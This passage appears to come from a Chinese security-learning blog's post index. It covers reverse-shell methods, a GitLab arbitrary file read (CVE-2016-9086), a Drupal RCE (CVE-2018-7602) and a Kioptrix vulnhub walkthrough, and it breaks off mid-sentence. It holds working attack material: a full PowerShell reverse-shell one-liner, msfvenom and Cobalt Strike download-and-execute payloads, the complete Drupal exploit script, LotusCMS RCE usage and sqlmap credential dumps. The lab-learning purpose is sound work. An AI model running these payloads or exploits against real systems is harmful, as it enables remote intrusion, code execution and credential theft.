-p cmd/windows/reverse_powershell LHOST=192.168.17.137 LPORT=8888  //host为被攻击机\n\npowershell -w hidden -nop -c $a=&#x27;192.168.17.137&#x27;;$b=8888;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#x27;cmd.exe&#x27;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) &#123;start-sleep -m 100;if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;$r=$os.BaseStream.EndRead($osread);$s.Write($ob,0,$r);$s.Flush();$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);&#125;if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;$r=$es.BaseStream.EndRead($esread);$s.Write($eb,0,$r);$s.Flush();$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);&#125;if ($s.DataAvailable) &#123;$r=$s.Read($nb,0,$nb.Length);if ($r -lt 1) &#123;break;&#125;else&#123;$str=$e.GetString($nb,0,$r);$is.write($str);&#125;&#125;if($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0))&#123;break;&#125;if($p.ExitCode -ne $null)&#123;break;&#125;&#125;\n靶机执行使用powershell执行payload，这里我一直闪退，也找不出什么原因，或许是这种方法被我的靶机识别了吧，这里采用一个生成exe文件的方式来反弹shell\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.17.137 LPORT=8888 -f exe -o payload.exe\n\n复制payload.exe到Windows机器，然后kali下开启msf使用如下命令监听8888端口：\nmsfconsole    //启动msfuse exploit/multi/handler          //使用msf的侦听模块exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcp        //设置载荷payload set LHOST 192.168.153.176               //设置本地监听机Ipset LPORT  4444              //设置监听端口     exploit\n\n设置完，在靶机上执行exe即可监听 成功\n\n\n6. Cobalt strike反弹shell\nCobalt strike的Scripted Web Delivery模块，可通过bitsadmin、powershell、python、regsvR32等进行反弹shell，类似metasploit的web_delivery模块\n运行服务端\n./teamserver 192.168.17.137 123 #123为连接密码\n\n运行客户端：\nWindows运行cobaltstrike.jar #用户名随便输入 密码123\n\n开启监听:\n点击Cobalt Strike-&gt;Listeners\npayload可选择windows/beacon_http/reverse_http\n说明：其中windows/beacon 是Cobalt Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign 为外部监听器，即msf或者Armitage的监听器。\n\n这里name随便，ip写服务器端，端口自定义\n生成powershell payload:\n点击Attack -&gt;Scripted Web Delivery\nType选择 powershell\n\n\npayload为\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.17.137:5566/a&#x27;))&quot;\n生成代码已经给出了，在windows上执行\n\n我是在上图位置执行的，不知道其他地方行不行。\n\n不过看见同一电脑上线两次，估计cmd里面执行也可\n\n右键点击interact进入shell，这里ipconfig等命令无法执行，应该是提权才能执行吧，这里不深入了\n这次写的反弹shell只是想有一个总体的了解，过程坎坷，不过我们不应该因为步骤复杂或者遇到困难而妥协，在过程中遇到问题解决问题同样可以学到东西。本次文章也有欠缺，不够完美，后续深入学习在继续更新吧。\n等等，有强迫症的我，了解了一下为何上述命令无法执行，因为某些命令只是cs自带的，那么ipconfig这种cs就没有，我们需要在前面加入shell即可执行\n\n五、参考文章\n反弹shell bash -i命令\n反弹shell失败 原来是这个原因\n反弹shell的方法总结\n[通过shell终端直接打开socket文件进行TCP、UDP通信（转）](https://cnblogs.com/zl1991/p/12524924.html)\nLinux 反弹 shell 学习\nKali linux zsh shell切换bash shell\n上面2-6的文章均为解决/dev/tcp找不到的方法\nPowerShell：因为在此系统上禁止运行脚本，解决方法\n内网隧道代理技术（六）之 PowerCat反弹Shell\nmsf反弹shell\n","categories":["反弹shell"],"tags":["基本知识"]},{"title":"Gitlab 任意文件读取漏洞（CVE-2016-9086）","url":"/2023/09/20/Gitlab%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-9086%EF%BC%89/","content":"0x01 漏洞概述\n\nGitLab 是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的 Git 项目仓库，可通过 Web 界面进行访问公开的或者私人项目。近日研究者发现在其多个版本中存在文件读取漏洞 (CVE-2016-9086) 和 任意用户 authentication_token 泄漏漏洞，攻击者可以通过这两个漏洞来获取管理员的权限，进而控制所有 gitlab 项目。\n\n影响版本：\n\n**任意文件读取漏洞 (CVE-2016-9086)：**GitLab CE/EEversions 8.9, 8.10, 8.11, 8.12, and 8.13\n**任意用户 authentication_token 泄露漏洞：**Gitlab CE/EE versions 8.10.3-8.10.5\n\n0x02 漏洞分析\n这里跟着佬的思路走一次，搞清漏洞发生原因即可\n从 8.9.0 版本开始，GitLab 新增了导入导出项目的功能。一个空的 gitlab 项目导出后结构如下：\nVERSION          # GitLab 的导出模块的版本project.json     # 包含了项目的配置文件\n当我们导入 GitLab 的导出文件的时候，GitLab 会按照如下步骤处理：\n\n服务器根据 VERSION 文件内容检测导出文件版本，如果版本符合，则导入。\n服务器根据 Project.json 文件创建一个新的项目，并将对应的项目文件拷贝到服务器上对应的位置。\n\n检测 VERSION 文件的代码位于：/lib/gitlab/import_export/version_checker.rb中：\n...def check!  version = File.open(version_file, &amp;:readline) #version变量将包含文件的第一行内容。  verify_version!(version)rescue =&gt; e  shared.error(e)  falseend...def verify_version!(version)    if Gem::Version.new(version) != Gem::Version.new(Gitlab::ImportExport.version)        raise Gitlab::ImportExport::Error.new(&quot;Import version mismatch: Required #&#123;Gitlab::ImportExport.version&#125; but was #&#123;version&#125;&quot;)    else        true    endend...\n​\t\t我们可以看到这里的逻辑是读取 VERSION 文件的第一行赋值给变量 version，然后检测 verison 与当前版本是否相同，相同返回 true，不相同则返回错误信息 (错误信息中包括变量 version 的值). 于是漏洞发现者 Jobert Abma 巧妙的使用了软链接来达到读取任意文件的目的。首先，我们给 VERSION 文件加上软链接并重新打包。\nln -sf /etc/passwd VERSIONtar zcf change_version.tar.gz ./\nln：这是创建链接的命令。    -sf：这是ln命令的选项：    -s 表示创建符号链接，即软链接。    -f 表示如果已存在名为VERSION的链接文件，则强制覆盖它，即使它已经存在。    /etc/passwd：这是源文件的路径，即要创建软链接的目标文件是/etc/passwd。    VERSION：这是要创建的软链接的名称，它将链接到/etc/passwd文件。\n这样，读取 VERSION 文件的时候服务器就会根据软链接读取到 /etc/passwd 的第一行内容并赋值给 version。但是由于 version 与当前版本不相同，所以会输出 version 的值，也就是 /etc/passwd 第一行的内容。\n**但是，如果只读取任意文件的第一行，能做的事情还是太少了。漏洞发现者显然不满足这一结果，他继续找了下去.**读取 Project.json 这一配置文件的代码位于：/lib/gitlab/import_export/project_tree_restorer.rb 中：\n...def restore  json = IO.read(@path)  tree_hash = ActiveSupport::JSON.decode(json)  project_members = tree_hash.delete(&#x27;project_members&#x27;)  ActiveRecord::Base.no_touching do    create_relations  endrescue =&gt; e  shared.error(e)  falseend...\n在这里，我们可以再次使用软链接使变量 json 获取到任意文件的内容，但是由于获取的文件不是 json 格式，无法 decode，导致异常抛出，最终在前端显示出任意文件的内容。 添加软链接并打包:\nln -sf /etc/passwd project.jsontar zcf change_version.tar.gz ./\n佬的思路就是完美\n0x03 漏洞复现\ndocker一键部署后访问8080端口，环境运行，ssh 端口为 10022。访问 http://your-ip:8080，设置管理员（用户名 root）密码，登录。\n默认管理员帐户的凭据为root和vulhub123456。\n![image-20230920204243371](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920204243371.png)\n这里新注册一个用户并登录，进入该页面后点击右上角的+号\n![image-20230920204911687](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920204911687.png)\n新建一个项目，点击 GitLab export：\n![image-20230920204940165](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920204940165.png)\n上传文件test.tar.gz，文件/etc/passwd内容会显示出来：\n![image-20230920205141629](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920205141629.png)\n![image-20230920205157712](Gitlab 任意文件读取漏洞（CVE-2016-9086）/image-20230920205157712.png)\n0x04 漏洞修复\n官方先移除了导入包里的软连接，其次，读取 VERSION 的内容和 project.json 的内容出错后将内容输出到日志里而非返回到前端。\n具体可以参考一下文章。\n0x05 参考文章\nGitlab 任意文件读取漏洞复现\nGitLab 任意文件读取漏洞 (CVE-2016-9086) 和任意用户 token 泄露漏洞\nGitLab 任意文件泄露 (CVE-2016-9086)\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Drupal 远程代码执行漏洞（CVE-2018-7602）","url":"/2023/09/19/Drupal%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-7602%EF%BC%89/","content":"0x01 漏洞概述\n​\t\t这个漏洞是CVE-2018-7600的绕过利用，两个漏洞原理是一样的。攻击者可以通过不同方式利用该漏洞远程执行代码。CVE-2018-7602这个漏洞是CVE-2018-7600的另一个利用点，只是入口方式不一样。所以，一旦参数可控并且没有经过正确的过滤，就很有可能出问题。\n0x02 影响版本\nDrupal &lt; 7.58Drupal &lt; 8.3.9Drupal &lt; 8.4.6Drupal &lt; 8.5.1\n0x03 环境搭建\n实战环境：\n历史版本 https://www.drupal.org/project/drupal/releases\n0x04 漏洞复现\n这里直接用docker启动了\n环境启动后访问如下链接，将会看到drupal的安装页面。如果没有mysql环境，安装的时候可以选择sqlite数据库。其他配置均默认即可。这里我选择sqlite\n![image-20230919192154141](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919192154141.png)\n![image-20230919192453204](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919192453204.png)\n后面无脑默认\n利用原理：对URL中的#进行编码两次，绕过sanitize()函数过滤\n这里直接上poc了，项目地址：https://github.com/pimps/CVE-2018-7600\n#!/usr/bin/env python3import requestsimport argparsefrom bs4 import BeautifulSoupdef get_args():  //获取参数  parser = argparse.ArgumentParser( prog=&quot;drupa7-CVE-2018-7602.py&quot;,                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),                    epilog= &#x27;&#x27;&#x27;                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form)                    with the &#x27;destination&#x27; variable and triggering it with the upload file via ajax (/file/ajax).                    &#x27;&#x27;&#x27;)  parser.add_argument(&quot;user&quot;, help=&quot;Username&quot;)  //用户名  parser.add_argument(&quot;password&quot;, help=&quot;Password&quot;)  //密码  parser.add_argument(&quot;target&quot;, help=&quot;URL of target Drupal site (ex: http://target.com/)&quot;)  //目标  parser.add_argument(&quot;-c&quot;, &quot;--command&quot;, default=&quot;id&quot;, help=&quot;Command to execute (default = id)&quot;)   //参数  parser.add_argument(&quot;-f&quot;, &quot;--function&quot;, default=&quot;passthru&quot;, help=&quot;Function to use as attack vector (default = passthru)&quot;)  parser.add_argument(&quot;-x&quot;, &quot;--proxy&quot;, default=&quot;&quot;, help=&quot;Configure a proxy in the format http://127.0.0.1:8080/ (default = none)&quot;)  args = parser.parse_args()  return argsdef pwn_target(target, username, password, function, command, proxy):  requests.packages.urllib3.disable_warnings()  //判断抓包无误  session = requests.Session() //获取seesion  proxyConf = &#123;&#x27;http&#x27;: proxy, &#x27;https&#x27;: proxy&#125;  //none proxy  try:    print(&#x27;[*] Creating a session using the provided credential...&#x27;)    get_params = &#123;&#x27;q&#x27;:&#x27;user/login&#x27;&#125;  //构造get    post_params = &#123;&#x27;form_id&#x27;:&#x27;user_login&#x27;, &#x27;name&#x27;: username, &#x27;pass&#x27; : password, &#x27;op&#x27;:&#x27;Log in&#x27;&#125; //构造post    print(&#x27;[*] Finding User ID...&#x27;)    session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf) //构造postseesion    get_params = &#123;&#x27;q&#x27;:&#x27;user&#x27;&#125;    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)  //构造getseesion    soup = BeautifulSoup(r.text, &quot;html.parser&quot;) //爬取页面    user_id = soup.find(&#x27;meta&#x27;, &#123;&#x27;property&#x27;: &#x27;foaf:name&#x27;&#125;).get(&#x27;about&#x27;)  //抓关键字    if (&quot;?q=&quot; in user_id):      user_id = user_id.split(&quot;=&quot;)[1]  //以=作分隔符，再通过索引[1]取出所得数组中的第二个元素的值    if(user_id):      print(&#x27;[*] User ID found: &#x27; + user_id)  //以上主要抓取user_id值    print(&#x27;[*] Poisoning a form using \\&#x27;destination\\&#x27; and including it in cache.&#x27;)    get_params = &#123;&#x27;q&#x27;: user_id + &#x27;/cancel&#x27;&#125;    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)    form = soup.find(&#x27;form&#x27;, &#123;&#x27;id&#x27;: &#x27;user-cancel-confirm-form&#x27;&#125;)    form_token = form.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;: &#x27;form_token&#x27;&#125;).get(&#x27;value&#x27;) //以上主要获取form_token参数值    // %23是#的URL编码    //其中%2523是对#的两次URL编码 %25是%的URL编码    //例如：POST /drupal-7.59/drupal-7.59/node/9/delete?destination=node?q[%2523][]=passthru%26q[%2523type]=markup%26q[%2523markup]=id    get_params = &#123;&#x27;q&#x27;: user_id + &#x27;/cancel&#x27;, &#x27;destination&#x27; : user_id +&#x27;/cancel?q[%23post_render][]=&#x27; + function + &#x27;&amp;q[%23type]=markup&amp;q[%23markup]=&#x27; + command &#125;    // # 绕过sanitize(),stripDangrousValues函数检查。    //在Drupal应用对destination URL进行处理时，会再次解码%23,获得#       post_params = &#123;&#x27;form_id&#x27;:&#x27;user_cancel_confirm_form&#x27;,&#x27;form_token&#x27;: form_token, &#x27;_triggering_element_name&#x27;:&#x27;form_id&#x27;, &#x27;op&#x27;:&#x27;Cancel account&#x27;&#125;    r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)    soup = BeautifulSoup(r.text, &quot;html.parser&quot;)    form = soup.find(&#x27;form&#x27;, &#123;&#x27;id&#x27;: &#x27;user-cancel-confirm-form&#x27;&#125;)    form_build_id = form.find(&#x27;input&#x27;, &#123;&#x27;name&#x27;: &#x27;form_build_id&#x27;&#125;).get(&#x27;value&#x27;)    //关键点是让系统缓存一个form_build_id，这个form存着我们传入的恶意参数，第二个请求从中取出来然后执行    //触发漏洞还是需要发两个post包，一个存入form_build_id一个取出后执行    if form_build_id:        print(&#x27;[*] Poisoned form ID: &#x27; + form_build_id)        print(&#x27;[*] Triggering exploit to execute: &#x27; + command)        get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/actions/cancel/#options/path/&#x27; + form_build_id&#125;        post_params = &#123;&#x27;form_build_id&#x27;:form_build_id&#125;        r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)        parsed_result = r.text.split(&#x27;[&#123;&quot;command&quot;:&quot;settings&quot;&#x27;)[0]        print(parsed_result)  except:    print(&quot;ERROR: Something went wrong.&quot;)    raisedef main():  print ()  print (&#x27;===================================================================================&#x27;)  print (&#x27;|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |&#x27;)  print (&#x27;|                                   by pimps                                      |&#x27;)  print (&#x27;===================================================================================\\n&#x27;)  args = get_args() # get the cl args  //return args  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip()) //目标，用户名，密码，参数值if __name__ == &#x27;__main__&#x27;:  main()\n如图所示，执行以下命令即可复现该漏洞。 示例命令为 ，如图红框中显示，可以执行该命令\n# &quot;id&quot;为要执行的命令 第一个drupal为用户名 第二个drupal为密码python3 drupa7-CVE-2018-7602.py -c &quot;id&quot; hybcx 123456 http://192.168.17.128:8081/\n![image-20230919194317426](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919194317426.png)\n查看内核版本\npython3 drupa7-CVE-2018-7602.py -c &quot;uname -a&quot; hybcx 123456 http://192.168.17.128:8081/\n![image-20230919194404102](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919194404102.png)\n查看敏感文件\npython3 drupa7-CVE-2018-7602.py -c &quot;cat ../../../../../../../etc/passwd&quot; hybcx 123456 http://192.168.17.128:8081/\n![image-20230919194525463](Drupal 远程代码执行漏洞（CVE-2018-7602）/image-20230919194525463.png)\n0x05 参考文章\nCVE-2018-7602 DRUPAL 内核远程代码执行漏洞分析     --代码审计层面\nDrupal 远程代码执行漏洞（CVE-2018-7602） \n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"vulnhub-KIOPTRIX LEVEL 1.2 (#3)","url":"/2023/09/23/KIOPTRIX%20LEVEL%201.2%20(#3)/","content":"0x01 前言\n最近也是学了内网一段时间，但比较迷茫，不知从哪里下手，甚至想考虑买课来学了，但是考虑到花钱-.-于是问了几个大佬说是先刷着内网靶场，在靶场中学习内网知识点，比如vulnhub，暗月靶场等等。还是那句话，即使迷茫也不要停下学习的脚步，说不定就恍然大悟了。。。\n话不多说，开始本人vulnhub靶场的刷题之旅\n0x02 靶场环境\n攻击机（kali）：192.168.17.137\n靶机下载地址：https://www.vulnhub.com/entry/kioptrix-level-12-3,24/\nkali 与靶机为同种网络模式（此处均为 NAT 模式）\n这里也是花了老长时间，我以为搭建也需要技术呢，搜了半天发现也没人说如何搭建，只是说攻击机与靶机一定要在同一ip段下，我也是直接下载后用vm虚拟机直接打开文件夹里的vmx文件，接着换为NAT模式，打开之后发现还要登录，我寻思密码呢？想了一下，说不定这个密码就是我们要获取的。先做着试试看\n0x03 靶场渗透\n3.1 信息搜集\n当然我们此时要清楚渗透流程，当然第一步就是信息搜集—这也是第一次实战，肯定大部分都是wp看的，质量肯定低（呜呜，太菜了~~）\n这里跟着wp将流程好好熟悉一下，下次打的时候争取少看wp！！！—争取命令都是手敲\n探测存活主机\nnetdiscover -r 192.168.17.0/24  \n![image-20230923191442890](KIOPTRIX LEVEL 1.2 (#3)/image-20230923191442890.png)\n这里搜集了四个emmm，盲猜就是第三个，毕竟剩余三个很奇怪\n端口扫描\nnmap -sS -sV -A -p 1-65535 192.168.17.143\n顺便熟悉一下nmap命令的参数细节  – 抓常用的\n1.扫描单个目标地址     nmap 192.168.0.1072.扫描多个目标地址，如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描。nmap 192.168.0.100 192.168.0.1073.扫描一个范围内的目标地址  nmap 192.168.0.100-110  可以指定扫描一个连接的网段，中间使用“-”连接4.扫描目标地址所在的某个网段 以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为：192.168.0.1-182.168.0.255nmap 192.168.0.0/24  5.扫描主机列表targets.txt中所有目标的地址nmap -iL  C:\\Users\\targets.txt   -iL 从文件中导入目标主机或者目标网段  //同一目录下可以不用绝对路径6.扫描除某一个目标地址之外的所有目标地址nmap 192.168.0.100/24 -exclude 192.168.0.107    //-exclude:后面跟的主机或网段将不在扫描的范围内7.扫描除某一个文件中的目标地址之外的目标地址nmap 192.168.0.100/24 -excludefile C:\\Users\\targets.txt   //-excludefile 导入文件中的主机或网段将不在扫描范围内8.扫描某一个目标地址的21，22，23，80端口如果不需要对目标主机进行全端口扫描，只想探测它是否开启某一端口，那么使用-p参数指定端口号，将大大提高扫描速度。nmap 192.168.0.107 -p 21,22,23,80     //-p指定端口9.对目标地址进行路由攻击   nmap --traceroute  192.168.0.10     //--traceroute 追踪每个路由节点10.扫描目标地址所在的C段的在线状态nmap -sP 192.168.0.107/24nmap -sn  192.168.0.107/24   //这个两个命令都是进行主机发现，-sP/-sn 关闭主机扫描 实现ping 功能11.对操作系统指纹的识别   nmap -O 192.168.0.107       //-O 对操作系统指纹的识别12.目标地址提供的服务版本检测    nmap -sV  192.168.0.107      //-sV 让nmap进行版本探测13.探测防火墙状态    nmap -sF -T4 192.168.0.107    //-sF进行FIN探测-T -T4指定扫描过程使用的时序，总共有6个级别（0-5）级别越高扫描速度越快，但是也容易被防火墙检测并屏蔽掉，在网络情况较好的是可以使用T4剩下的就是命令组合的了\n具体可参考：nmap常用命令详细使用|命令带实例   --这里简单过一下，日后用的时候看着用，熟练就好了\n![image-20230923192950046](KIOPTRIX LEVEL 1.2 (#3)/image-20230923192950046.png)\n扫到如上信息，接着看一下靶机附带文件给的信息\n![image-20230923193028820](KIOPTRIX LEVEL 1.2 (#3)/image-20230923193028820.png)\n这里没咋懂他的意思，估计是修改域名解析吧，我们看看wp\nwp：按提示添加 host 记录到攻击机：sudo nano /etc/hosts\n没用过这个命令，所以我用vim了vim /etc/hosts，添加内容：192.168.17.143 kioptrix3.com\n![image-20230923193441839](KIOPTRIX LEVEL 1.2 (#3)/image-20230923193441839.png)\n这里新kali没dirsearch，等我下载一下，这里又看到一个小tip\n192.168.233.1\t\tvm8网卡192.168.233.2\t\t网关192.168.233.177\t\t靶机192.168.233.254\t\tDHCP服务器\n故此我们猜的是对的\nweb目录扫描\n使用 dirsearch 进行目录扫描：dirsearch -u http://kioptrix3.com -x 400-599 -t 50\n此处-x是为了排除页面400-599的状态码回显，-t为设置线程数，不过似乎不设置 hosts直接扫ip也可以吧，但说不定后续有用？\n![image-20230923194338037](KIOPTRIX LEVEL 1.2 (#3)/image-20230923194338037.png)\n访问了一下，发现已经有了web网站了，我们看一下扫出的结果，一个个访问看看有什么想信息\n[19:43:15] 200 -    2KB - /cache/                                           [19:43:15] 301 -  353B  - /cache  -&gt;  http://kioptrix3.com/cache/           [19:43:18] 200 -  688B  - /core/fragments/moduleInfo.phtml                  [19:43:18] 301 -  352B  - /core  -&gt;  http://kioptrix3.com/core/             [19:43:23] 200 -   23KB - /favicon.ico                                      [19:43:24] 301 -  355B  - /gallery  -&gt;  http://kioptrix3.com/gallery/       [19:43:27] 200 -    2KB - /index.php                                        [19:43:27] 200 -    2KB - /index.php/login/                                 [19:43:33] 200 -    2KB - /modules/                                         [19:43:33] 301 -  355B  - /modules  -&gt;  http://kioptrix3.com/modules/       [19:43:37] 301 -  358B  - /phpmyadmin  -&gt;  http://kioptrix3.com/phpmyadmin/ [19:43:38] 200 -    8KB - /phpmyadmin/                                      [19:43:38] 200 -    8KB - /phpmyadmin/index.php                             [19:43:46] 301 -  353B  - /style  -&gt;  http://kioptrix3.com/style/           [19:43:49] 200 -   18B  - /update.php     \n![image-20230923194820587](KIOPTRIX LEVEL 1.2 (#3)/image-20230923194820587.png)\n访问了一下，直接用admin就登进去了\n![image-20230923194938034](KIOPTRIX LEVEL 1.2 (#3)/image-20230923194938034.png)\n不过似乎没啥信息，接着看了update.php，发现无权访问，这里肯定有问题\n![image-20230923195108757](KIOPTRIX LEVEL 1.2 (#3)/image-20230923195108757.png)\n接着看了modules目录，展示了此网站目录结构\n![image-20230923195459051](KIOPTRIX LEVEL 1.2 (#3)/image-20230923195459051.png)\n总的来说，没啥思路了┭┮﹏┭┮，看wp吧\nweb网站指纹扫描\n针对 web 页面进行信息搜集，使用 whatweb 扫描网站信息：whatweb http://kioptrix3.com\n![image-20230923200117955](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200117955.png)\n发现关键词，lotusCMS，直觉告诉我此处必有漏洞，搜了一番发现此系统有一个RCE漏洞，直接将其exp先下载一下，接着看看网站那里存在CMS\n![image-20230923200516077](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200516077.png)\n在访问后页面有个login点击发现，此登录功能采用的就是上述CMS，看了wp有如下思路\n通过 searchsploit 查询此 CMS 相关漏洞：searchsploit lotuscms\n![image-20230923200651665](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200651665.png)\n恰好跟我搜的RCE对上了，接着wp说：查找到存在 RCE 但是需要用到 MSF，为贴近 OSCP 考试，尽量不使用 MSF，上网查询是否存在其他 exp 代码，好好好~~这么玩是吧，那我紧跟佬的步伐0.o\n这是佬的搜索方法\n![image-20230923200828274](KIOPTRIX LEVEL 1.2 (#3)/image-20230923200828274.png)\n我也附上exp链接：https://github.com/Hood3dRob1n/LotusCMS-Exploit\n3.2 漏洞利用\nlotusCMS-RCE\n将其下载到攻击机并赋予可执行权限：这里我直接将zip拖进kali了\n![image-20230923201145279](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201145279.png)\n#!/bin/bash# Lotus CMS 3.0 eval() Remote Command Execition Exploit# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/# Scripted in Bash by HR# USAGE: ./lotusRCE.sh target lotusCMS-path# USAGE: ./lotusRCE.sh ki0ptrix3.com /# USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/# Enter IP and PORT when asked to spawn netcat based reverse shell ;)#Start the magictarget=&quot;$1&quot; #Target site, ex: 192.168.1.36 or ki0ptrix3.com (no http://)path=&quot;$2&quot; # Path to LotusCMS, ex: /lcms/ or /junk=/tmpstorage1=$(mktemp -p &quot;$junk&quot; -t fooooobar1.tmp.XXX)storage2=$(mktemp -p &quot;$junk&quot; -t fooooobar2.tmp.XXX)\n此处为代码的用法，可以看出是要反弹shell的。\n先新建窗口建立起 nc 监听：nc -lvnp 4444\n然后运行 exp 代码：./lotusRCE.sh kioptrix3.com /\n运行后按提示输入用于接收反弹 shell 的 IP 和端口，并选择反弹方式：\n![image-20230923201445552](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201445552.png)\n![image-20230923201609119](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201609119.png)\n选择反弹方式 1 之后，nc 收到反弹 shell，权限为 www-data：\n![image-20230923201646856](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201646856.png)\n使用 Python 建立 TTY Shell：python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'\n翻一下目录尝试搜集有效信息，在当前位置下的 /gallery 文件夹下发现存在疑似配置文件 gconfig.php：\n![image-20230923201913897](KIOPTRIX LEVEL 1.2 (#3)/image-20230923201913897.png)\n读取看一下，发现存在数据库的配置信息\n![image-20230923202004834](KIOPTRIX LEVEL 1.2 (#3)/image-20230923202004834.png)\n$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;\n存一下，接着想到了phpmyadmin，我们登陆看看，这里也是震惊了，之前我只用 admin登录，现在用上述给的账号密码登录，页面回显竟然不一样。。。\nssh登录用户\n![image-20230923202247609](KIOPTRIX LEVEL 1.2 (#3)/image-20230923202247609.png)\n接着发现了两处用户信息\ndev_accounts 表中的用户信息：\ndreg \t\t\t0d3eccfb887aabd50f243b3f155c0f85loneferret  \t5badcaf789d3d1d09794d8f021f40f0e\ngallarific_users表中的信息：\nadmin \tn0t7t1k4  superuser\n这里用md5解密看看，上述dev表解密的信息为：\nMast3r 与 starwars\n接着前往之前的登录页面看看，发现上述三个都登录不上，接着wp说\n换 ssh 登录，dreg、loneferret 可成功登录。\n这里dreg用户没有信息，登录另一个即可。\n接着佬又开始漏洞挖掘了，访问 http://kioptrix3.com/gallery/ 进行漏洞挖掘：\n![image-20230923203825517](KIOPTRIX LEVEL 1.2 (#3)/image-20230923203825517.png)\n如图我发现点击每个链接，页面都会回显一些18禁的内容。。。。。。我真被震惊到了，估计是题目现在出问题了？，于是我还是直接访问答案吧。\n点击页面 Ligoat Press Room 进入新页面，左下角有排序选项框，任选之后发现 url 出现了 id 参数：（但我根本点不了）\n![image-20230923204011375](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204011375.png)\n将此 url 丢到 sqlmap 进行测试：\nsqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot;\n![image-20230923204344017](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204344017.png)\n如图发现存在sql注入，接着爆数据库，表名等等，不过猜测爆出来的就是刚刚RCE得到的\n利用sqlmap得到数据库名：sqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; --dbssqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery --tables --batchsqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery -T dev_accounts --columns --batchsqlmap -u &quot;http://kioptrix3.com/gallery/gallery.php?id=1&quot; -D gallery -T dev_accounts -C username,password --dump --batch\n![image-20230923204513242](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204513242.png)\n![image-20230923204602653](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204602653.png)\n![image-20230923204728931](KIOPTRIX LEVEL 1.2 (#3)/image-20230923204728931.png)\n最终得到用户名和密码\nsudo权限提升\n查看 loneferret 用户，家目录下存在两个文件，可执行脚本 checksec.sh 是逆向中用于检测目标文件使用了哪些防护技术的，在 CompanyPolicy.README 文件中找到提示信息，要运行命令：sudo ht\n这里我采用的finalshell连接ssh，佬是用kali的\nht 编辑器使用说明：https://www.aldeid.com/wiki/HT-Editor\n按 F3 